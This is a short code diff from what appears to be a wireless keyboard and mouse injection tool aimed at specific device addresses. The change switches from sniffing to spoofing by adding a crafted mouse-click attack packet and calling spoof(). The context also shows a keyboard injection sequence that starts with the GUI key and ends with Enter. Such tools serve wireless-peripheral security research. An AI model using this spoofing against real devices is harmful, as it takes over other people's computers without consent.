@@ -172,7 +172,7 @@ qware_keyboard = Qware_Keyboard("3d:99:52:9c", 0x11021, 0xc5c5)
 qware_mouse= Qware_Mouse("3d:99:52:9c:11", 0x11021, 0x784e)
 
 #qware_keyboard.sniff()
-qware_mouse.sniff()
+#qware_mouse.sniff()
 
 attack_qware_keyboard = [
     qware_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
@@ -185,4 +185,7 @@ attack_qware_keyboard = [
     qware_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
 ]
 
+attack_qware_mouse = [qware_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="fe0100ff01", scrolling_move="FF")]
+
 #qware_keyboard.spoof(attack_qware_keyboard)
+qware_mouse.spoof(attack_qware_mouse)
